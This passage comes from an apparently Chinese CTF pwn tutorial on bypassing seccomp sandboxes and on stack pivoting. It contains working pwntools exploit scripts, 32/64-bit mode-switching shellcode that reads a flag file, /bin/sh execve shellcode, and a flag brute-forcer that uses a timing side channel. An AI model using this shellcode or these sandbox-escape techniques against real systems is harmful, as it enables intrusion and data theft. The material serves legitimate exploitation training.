<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0003</span><br><span class="line"> 0002: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0007</span><br><span class="line"> 0003: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0006</span><br><span class="line"> 0004: 0x15 0x01 0x00 0x00000001  if (A == write) goto 0006</span><br><span class="line"> 0005: 0x15 0x00 0x01 0x00000005  if (A != fstat) goto 0007</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure></div>

<p>这道题的 BPF 规则（反汇编）**只看了 <code>nr</code>**，并没有先确认 <code>arch</code>。</p>
<p>于是当你切到 32 位兼容模式，用 <code>int 0x80</code> 触发 <strong>i386 号表</strong>时，过滤器仍只看见 <strong>“<code>nr = 5</code>”</strong>——它把这当成**允许的 64 位 <code>fstat</code>**，实际却放行了 **32 位的 <code>open</code>**。这就是“撞号”本质。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">CS32 = <span class="number">0x23</span>  <span class="comment"># 常见 32-bit user CS</span></span><br><span class="line">CS64 = <span class="number">0x33</span>  <span class="comment"># 常见 64-bit user CS</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_bytes_as_asm</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;/* empty */&quot;</span></span><br><span class="line">    lines = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">16</span>):</span><br><span class="line">        chunk = data[i:i + <span class="number">16</span>]</span><br><span class="line">        lines.append(<span class="string">&quot;.byte &quot;</span> + <span class="string">&quot;,&quot;</span>.join(<span class="string">f&quot;0x<span class="subst">&#123;b:02x&#125;</span>&quot;</span> <span class="keyword">for</span> b <span class="keyword">in</span> chunk))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;\n        &quot;</span>.join(lines)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_stage1</span>(<span class="params">read_size: <span class="built_in">int</span>, map_size: <span class="built_in">int</span> = <span class="number">64</span> * <span class="number">1024</span> * <span class="number">1024</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    极简 Stage-1：mmap(MAP_32BIT|RWX) → read(stage2) → 切栈 → jmp base</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    sc = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        /* mmap(NULL, map_size, PROT=7, MAP_PRIVATE|MAP_ANON|MAP_32BIT, -1, 0) */</span></span><br><span class="line"><span class="string">        xor     edi, edi</span></span><br><span class="line"><span class="string">        mov     esi, <span class="subst">&#123;map_size&#125;</span></span></span><br><span class="line"><span class="string">        push    7</span></span><br><span class="line"><span class="string">        pop     rdx</span></span><br><span class="line"><span class="string">        push    0x62</span></span><br><span class="line"><span class="string">        pop     r10</span></span><br><span class="line"><span class="string">        push    -1</span></span><br><span class="line"><span class="string">        pop     r8</span></span><br><span class="line"><span class="string">        xor     r9d, r9d</span></span><br><span class="line"><span class="string">        mov     al, 9</span></span><br><span class="line"><span class="string">        syscall                              /* rax = base */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /* read(0, base, read_size) */</span></span><br><span class="line"><span class="string">        xor     edi, edi</span></span><br><span class="line"><span class="string">        mov     rsi, rax</span></span><br><span class="line"><span class="string">        mov     edx, <span class="subst">&#123;read_size&#125;</span></span></span><br><span class="line"><span class="string">        xor     eax, eax</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /* rsp = base + read_size; jmp base */</span></span><br><span class="line"><span class="string">        lea     rsp, [rsi+<span class="subst">&#123;read_size + (map_size - read_size) // <span class="number">2</span>&#125;</span>]</span></span><br><span class="line"><span class="string">        jmp     rsi</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> sc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_stage2_retf</span>(<span class="params">sc32: <span class="built_in">bytes</span>, sc64_tail: <span class="built_in">bytes</span> = <span class="string">b&quot;&quot;</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    64-&gt;32-&gt;64 桥接 + 载荷（retf 模式，要求目标环境有 32 位段 CS=0x23）</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    sc32_bytes = _bytes_as_asm(sc32)</span><br><span class="line">    sc64_bytes = _bytes_as_asm(sc64_tail)</span><br><span class="line">    asm_all = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        .intel_syntax noprefix</span></span><br><span class="line"><span class="string">        .p2align 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /* 64 -&gt; 32：把 (EIP32 | CS&lt;&lt;32) 压入，再 RETFQ */</span></span><br><span class="line"><span class="string">        lea     rax, [rip+sc32_entry]</span></span><br><span class="line"><span class="string">        mov     edx, <span class="subst">&#123;CS32&#125;</span></span></span><br><span class="line"><span class="string">        shl     rdx, 32</span></span><br><span class="line"><span class="string">        or      rax, rdx</span></span><br><span class="line"><span class="string">        push    rax</span></span><br><span class="line"><span class="string">        .byte 0xcb                          /* retf */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        .code32</span></span><br><span class="line"><span class="string">    sc32_entry:</span></span><br><span class="line"><span class="string">        /* 32-bit 载荷 */</span></span><br><span class="line"><span class="string">        <span class="subst">&#123;sc32_bytes&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /* 32 -&gt; 64：先 push CS，再 push EIP，再 retf */</span></span><br><span class="line"><span class="string">        call    1f</span></span><br><span class="line"><span class="string">    1:  pop     edx</span></span><br><span class="line"><span class="string">        add     edx, (sc64_entry - 1b)      /* edx = &amp;sc64_entry (低32位) */</span></span><br><span class="line"><span class="string">        push    <span class="subst">&#123;CS64&#125;</span></span></span><br><span class="line"><span class="string">        push    edx</span></span><br><span class="line"><span class="string">        .byte 0xcb                          /* retf */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        .code64</span></span><br><span class="line"><span class="string">    sc64_entry:</span></span><br><span class="line"><span class="string">        <span class="subst">&#123;sc64_bytes&#125;</span></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> asm(asm_all)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sc32 = asm(<span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            /* open(&quot;./flag&quot;, O_RDONLY, 0) */</span></span><br><span class="line"><span class="string">            push    0x1010101</span></span><br><span class="line"><span class="string">            xor     dword ptr [esp], 0x1016660</span></span><br><span class="line"><span class="string">            push    0x6c662f2e</span></span><br><span class="line"><span class="string">            mov     eax, 5</span></span><br><span class="line"><span class="string">            mov     ebx, esp</span></span><br><span class="line"><span class="string">            xor     ecx, ecx</span></span><br><span class="line"><span class="string">            int     0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            /* read(fd, esp, 0x400) */</span></span><br><span class="line"><span class="string">            mov     ebx, eax</span></span><br><span class="line"><span class="string">            mov     ecx, esp</span></span><br><span class="line"><span class="string">            mov     edx, 0x400</span></span><br><span class="line"><span class="string">            mov     eax, 3</span></span><br><span class="line"><span class="string">            int     0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            /* write(1, esp, n) */</span></span><br><span class="line"><span class="string">            mov     ebx, 1</span></span><br><span class="line"><span class="string">            mov     eax, 4</span></span><br><span class="line"><span class="string">            int     0x80</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, bits=<span class="number">32</span>)</span><br><span class="line">    sc64 = asm(<span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        /* write(1, msg, len) */</span></span><br><span class="line"><span class="string">        mov     edi, 1</span></span><br><span class="line"><span class="string">        lea     rsi, [rip+msg]</span></span><br><span class="line"><span class="string">        mov     edx, 14</span></span><br><span class="line"><span class="string">        mov     eax, 1</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov     eax, 60</span></span><br><span class="line"><span class="string">        xor     edi, edi</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">    msg: .ascii &quot; [back to 64]\n&quot;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br><span class="line">    stage2 = build_stage2_retf(sc32, sc64)</span><br><span class="line"></span><br><span class="line">    stage1 = build_stage1(</span><br><span class="line">        read_size=<span class="built_in">len</span>(stage2),</span><br><span class="line">        map_size=(<span class="built_in">len</span>(stage2) + <span class="number">0x500</span> + <span class="number">0xFFF</span>) &amp; ~<span class="number">0xFFF</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;stage1_len =&quot;</span>, <span class="built_in">len</span>(stage1))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;stage2_len =&quot;</span>, <span class="built_in">len</span>(stage2))</span><br><span class="line"></span><br><span class="line">    io = gdb.debug_shellcode(stage1)</span><br><span class="line">    io.send(stage2)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h4 id="直接使用-i386-模式系统调用"><a href="#直接使用-i386-模式系统调用" class="headerlink" title="直接使用 i386 模式系统调用"></a>直接使用 i386 模式系统调用</h4><p>在（启用了 IA32 兼容的）x86‑64 Linux 上，64 位进程执行 <code>int 0x80</code> 会走内核的 <strong>兼容入口</strong>，按 <strong>32 位 i386 ABI</strong> 来解释<strong>参数与系统调用号</strong>。</p>
<blockquote>
<p>要想走 compat 路径，内核需要启用 **<code>CONFIG_IA32_EMULATION</code>**（即 64 位内核上的 i386 兼容层）；否则 32 位调用接口不可用（在一些系统上会直接失败&#x2F;不可用）。</p>
</blockquote>
<p>也就是说在 x86‑64 Linux 上，用户态执行 <code>int 0x80</code> 会进入内核的 **<code>entry_INT80_compat</code>**（不论来自 32 位还是 64 位代码），因此走的是 <strong>compat（32 位）</strong> 的系统调用路径。因此：</p>
<ul>
<li>用的是 <strong>32 位的系统调用号表</strong>，而不是 64 位那套。</li>
<li>系统调用号在 **<code>EAX</code>**；参数依次放 **<code>EBX, ECX, EDX, ESI, EDI, EBP</code>**；返回值在 **<code>EAX</code>**（再被符号扩展到 64 位）。</li>
</ul>
<p>例如 <code>write</code> 在 i386 是 <strong>4</strong>：<code>EAX=4, EBX=1, ECX=buf, EDX=len</code>，与 64 位 ABI（<code>syscall</code> 指令、<code>RAX=1, RDI, RSI, RDX, R10, R8, R9</code>）完全不同。</p>
<p>下面这段 shellcode 可以在 64 位下禁用 <code>execve</code> 的情况下执行 <code>/bin/sh</code>：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">.intel_syntax noprefix</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* mmap(NULL, 0x1000,</span></span><br><span class="line"><span class="string">        PROT_READ|PROT_WRITE|PROT_EXEC,</span></span><br><span class="line"><span class="string">        MAP_PRIVATE|MAP_ANONYMOUS|MAP_32BIT,</span></span><br><span class="line"><span class="string">        -1, 0)</span></span><br><span class="line"><span class="string">   __NR_mmap(amd64) = 9</span></span><br><span class="line"><span class="string">   PROT = 1|2|4 = 7</span></span><br><span class="line"><span class="string">   MAP_PRIVATE = 2, MAP_ANONYMOUS = 0x20, MAP_32BIT = 0x40 =&gt; flags = 0x62</span></span><br><span class="line"><span class="string">*/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor     edi, edi              /* addr = NULL */</span></span><br><span class="line"><span class="string">mov     esi, 0x1000           /* length = 0x1000 */</span></span><br><span class="line"><span class="string">mov     edx, 7                /* PROT_RWX */</span></span><br><span class="line"><span class="string">mov     r10d, 0x62            /* flags = MAP_PRIVATE|ANON|MAP_32BIT */</span></span><br><span class="line"><span class="string">mov     r8d, -1               /* fd = -1 */</span></span><br><span class="line"><span class="string">xor     r9d, r9d              /* offset = 0 */</span></span><br><span class="line"><span class="string">mov     eax, 9                /* __NR_mmap */</span></span><br><span class="line"><span class="string">syscall                       /* rax = base (低 32bit 可用) */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov     rbx, rax              /* rbx = base, 用来给 32 位 execve 做指针 */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* 写入 &quot;/bin/sh\\0&quot; */</span></span><br><span class="line"><span class="string">mov     dword ptr [rbx], 0x6e69622f      /* &quot;/bin&quot; */</span></span><br><span class="line"><span class="string">mov     dword ptr [rbx+4], 0x0068732f    /* &quot;/sh\\0&quot; */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* 在后面布 argv = &#123; binsh, NULL &#125; */</span></span><br><span class="line"><span class="string">mov     [rbx+8], rbx          /* argv[0] = binsh */</span></span><br><span class="line"><span class="string">mov     qword ptr [rbx+16], 0 /* argv[1] = NULL */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* 用 32 位 ABI 调 execve(&quot;/bin/sh&quot;, argv, NULL) */</span></span><br><span class="line"><span class="string">mov     eax, 11               /* __NR_execve (i386) */</span></span><br><span class="line"><span class="string">/* ebx = binsh (rbx 的低 32 位) */</span></span><br><span class="line"><span class="string">lea     rcx, [rbx+8]          /* ecx = argv */</span></span><br><span class="line"><span class="string">xor     edx, edx              /* envp = NULL */</span></span><br><span class="line"><span class="string">int     0x80                  /* 走 compat/i386 号表 */</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, bits = <span class="number">64</span>)</span><br></pre></td></tr></table></figure></div>

<p>然而在 64 位系统下上述代码最终执行的是一个 64 位的 <code>/bin/sh</code>，因此这个 <code>/bin/sh</code> 继承了沙箱，无法执行命令。</p>
<h3 id="使用-shellcode-侧信道爆破-flag"><a href="#使用-shellcode-侧信道爆破-flag" class="headerlink" title="使用 shellcode 侧信道爆破 flag"></a>使用 shellcode 侧信道爆破 flag</h3><p>如果沙箱完全禁用了所有 <code>write</code> 相关的系统调用（有的题目是关闭了输出流）则需要采用 shellcode 侧信道爆破 flag 。</p>
<p>注意：如果 <code>close(0/1/2)</code> 的形式则远端直接 “get EOF”，无法判断程序是否崩溃，此时不能通过侧信道爆破。</p>
<p>例如这道<a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/30" >题目<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>这里有一个判断进程是否退出的技巧：<code>p.recv(timeout=1)</code> 。如果进程已经结束会触发异常，而进程未结束但没有输出导致超时则接收数据长度为 0 ，并不会触发异常。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line">context(arch=elf.arch, os=elf.os)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">c</span>):</span><br><span class="line">    p = process([elf.path])</span><br><span class="line">    shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            push 0x67616c66</span></span><br><span class="line"><span class="string">            mov rdi, rsp</span></span><br><span class="line"><span class="string">            xor esi, esi</span></span><br><span class="line"><span class="string">            push 2</span></span><br><span class="line"><span class="string">            pop rax</span></span><br><span class="line"><span class="string">            syscall</span></span><br><span class="line"><span class="string">            mov rdi, rax</span></span><br><span class="line"><span class="string">            mov rsi, rsp</span></span><br><span class="line"><span class="string">            mov edx, 0x100</span></span><br><span class="line"><span class="string">            xor eax, eax</span></span><br><span class="line"><span class="string">            syscall</span></span><br><span class="line"><span class="string">            mov dl, [rsp + &#123;&#125;]</span></span><br><span class="line"><span class="string">            cmp dl, &#123;&#125;</span></span><br><span class="line"><span class="string">            jbe $</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span>.<span class="built_in">format</span>(i, c))</span><br><span class="line">    p.send(shellcode)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.recv(timeout=<span class="number">1</span>)</span><br><span class="line">        p.kill()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    l = <span class="number">0x20</span></span><br><span class="line">    r = <span class="number">0x7f</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        m = (l + r) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> check(m):</span><br><span class="line">            r = m</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l = m + <span class="number">1</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(l)</span><br><span class="line">    log.info(flag)</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<h3 id="使用-close-绕过-fd-参数检查"><a href="#使用-close-绕过-fd-参数检查" class="headerlink" title="使用 close 绕过 fd 参数检查"></a>使用 close 绕过 fd 参数检查</h3><p>例如这道<a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/33%20xl" >题目<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>的沙箱规定 <code>read</code> 的 fd 必须为 0 ，即只能从标准输入读入。</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">➜ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x04 0xc000003e  if (A != ARCH_X86_64) goto 0006</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0005</span><br><span class="line"> 0004: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0005: 0x25 0x00 0x01 0x00000110  if (A &lt;= 0x110) goto 0007</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0007: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0009: 0x15 0x00 0x05 0x00000000  if (A != read) goto 0015</span><br><span class="line"> 0010: 0x20 0x00 0x00 0x00000014  A = fd &gt;&gt; 32 # read(fd, buf, count)</span><br><span class="line"> 0011: 0x15 0x00 0x04 0x00000000  if (A != 0x0) goto 0016</span><br><span class="line"> 0012: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)</span><br><span class="line"> 0013: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0016</span><br><span class="line"> 0014: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0015: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0017</span><br><span class="line"> 0016: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure></div>

<p>绕过方法是在 orw 之前先用 rop 调用 <code>close</code> 关闭标准输入，这样再 <code>open</code> 返回的 <code>fd</code> 就是 0 了。</p>
<h1 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h1><p>栈迁移主要是为了解决栈溢出溢出空间大小不足的问题。</p>
<p>通过栈溢出将将栈中的ebp覆盖为fake_ebp-4（64位为fake_ebp-8，因为leave指令mov esp,ebp之后还有pop ebp使得esp增加），通过两次leave可以将esp的值改为fake_ebp，从而完成栈迁移，这样就可以在溢出空间不足的情况下构造完整的rop链。</p>
<h2 id="栈迁移到数据填充段"><a href="#栈迁移到数据填充段" class="headerlink" title="栈迁移到数据填充段"></a>栈迁移到数据填充段</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux%20%E6%A0%88%E6%BA%A2%E5%87%BA/images/41c4d94f80c46b5ce1ddd2376a57f3d1.png"
                     
                ></p>
<p>将栈迁移到数据填充段中，执行其中的rop。</p>
<h2 id="栈迁移到其它空闲地址"><a href="#栈迁移到其它空闲地址" class="headerlink" title="栈迁移到其它空闲地址"></a>栈迁移到其它空闲地址</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux%20%E6%A0%88%E6%BA%A2%E5%87%BA/images/db12ad52b7a1912665ab0bc5ed002e66.png"
                     
                ></p>
<p>调用<code>read</code>函数将rop写入空闲地址中，然后将栈迁移到该地址执行该rop。</p>
<p>这里返回到<code>read</code>函数时会有<code>push ebp</code>保存ebp值，<code>read</code>函数中的<code>leave;ret</code>语句不会对栈迁移造成影响，因此还要再加一个<code>leave;ret</code>。</p>
